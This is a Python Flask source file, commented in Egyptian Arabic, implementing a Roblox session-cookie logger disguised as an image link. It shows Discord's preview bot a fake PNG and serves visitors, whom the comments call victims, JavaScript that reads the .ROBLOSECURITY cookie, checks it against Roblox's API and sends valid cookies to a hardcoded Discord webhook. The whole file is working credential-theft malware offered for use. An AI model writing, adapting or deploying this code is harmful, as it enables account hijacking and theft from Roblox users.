from flask import Flask, request
import base64

app = Flask(__name__)

# غيّر الويب هوك بتاعك هنا
WEBHOOK = "https://discord.com/api/webhooks/1444749091312636054/FZRqE6Lk2gU0QCAANeyAiLq8Tqo3W4AEzDTcRBRjdPX7wJFZUMSFCMLu12F6EYyz0L4C"

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def rocl2_image_logger(path):
    ua = request.headers.get('User-Agent', '')

    # لديسكورد بوت: صورة PNG عشان preview يشتغل زي RoCL
    if 'Discordbot' in ua or 'discord' in ua.lower():
        fake_img = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==')
        return fake_img, 200, {'Content-Type': 'image/png'}

    # HTML للضحية: صورة + JS من RoCL-2 للكوكي مع validation
    html = f"""<!DOCTYPE html>
<html><body style="margin:0;background:#000">
<img src="https://www.strangerdimensions.com/wp-content/uploads/2012/01/herobrine.jpg" style="width:100%;height:100vh;object-fit:contain">

<script>
// RoCL-2 Updated for 2025 - Cookie Logger فقط (من lilmond/RoCL-2 مع تعديلات)
setTimeout(() => {{
  // قراءة الكوكي زي RoCL-2: document.cookie أو storage
  let cookies = document.cookie;
  let robloMatch = cookies.match(/\\.ROBLOSECURITY=([^;]+)/);
  let robloCookie = robloMatch ? robloMatch[1] : (localStorage.getItem('.ROBLOSECURITY') || sessionStorage.getItem('.ROBLOSECURITY'));

  if (robloCookie && robloCookie.length > 50) {{
    // Validation زي RoCL-2: تحقق من صحة الكوكي عبر API
    fetch('https://users.roblox.com/v1/users/authenticated', {{
      method: 'GET',
      headers: {{'Cookie': '.ROBLOSECURITY=' + robloCookie}}
    }})
    .then(r => r.json())
    .then(data => {{
      if (data.id) {{
        // ابعت للويب هوك زي RoCL-2 webhook
        fetch("{WEBHOOK}", {{
          method: "POST",
          headers: {{"Content-Type": "application/json"}},
          body: JSON.stringify({{
            username: "RoCL-2 Logger",
            embeds: [{{
              title: ".ROBLOSECURITY Valid Cookie",
              description: robloCookie,
              color: 0x00ff00,
              footer: {{text: "User ID: " + data.id}}
            }}]
          }})
        }});
      }} else {{
        // لو invalid، ما نبعتش حاجة
      }}
    }})
    .catch(() => {{}}); // Silent fail زي RoCL-2
  }}
}}, 1000);

</script>
</body></html>"""

    return html, 200, {'Content-Type': 'text/html; charset=utf-8'}

if __name__ == "__main__":
    app.run()
